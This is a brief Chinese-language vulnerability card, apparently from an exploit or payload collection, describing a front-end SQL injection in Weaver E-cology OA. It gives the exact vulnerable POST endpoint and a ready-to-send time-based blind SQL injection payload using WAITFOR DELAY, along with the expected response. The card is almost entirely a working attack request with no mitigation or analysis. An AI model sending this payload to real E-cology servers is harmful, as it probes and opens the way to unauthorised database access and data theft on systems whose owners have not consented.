# 泛微E-cology前台SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1`

**Payload**
```
fileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1
```
- **响应特征**：200